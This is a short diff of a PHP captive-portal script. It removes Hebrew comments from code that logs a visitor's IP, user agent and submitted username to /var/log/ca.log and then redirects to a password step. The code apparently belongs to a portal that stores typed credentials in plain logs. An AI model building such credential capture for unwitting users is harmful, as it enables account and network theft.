@@ -16,7 +16,7 @@ $ip   = norm_ip($_SERVER['REMOTE_ADDR'] ?? '0.0.0.0');
 $ua   = substr($_SERVER['HTTP_USER_AGENT'] ?? '-', 0, 180);
 $when = gmdate('c');
 
-/* אותו פורמט לוג כמו בשלב הסיסמה – רק עם password ריק */
+
 $line = json_encode([
   'ts'    => $when,
   'ip'    => $ip,
@@ -24,7 +24,7 @@ $line = json_encode([
   'token' => ['user' => $user, 'password' => '']
 ], JSON_UNESCAPED_UNICODE) . PHP_EOL;
 
-/* כתיבה ל-/var/log/ca.log או לוג חלופי בפרויקט */
+
 $primary = '/var/log/ca.log';
 $fallbackDir  = __DIR__ . '/logs';
 $fallbackFile = $fallbackDir . '/ca.log';
@@ -41,6 +41,6 @@ if (!$ok) { error_log("captive-portal: FAILED to write save.php"); http_response
 
 error_log("captive-portal: $line");
 
-/* מפנים לשלב הסיסמה (ללא JS) */
 header('Location: password.php?user=' . urlencode($user), true, 303);
 exit;
+
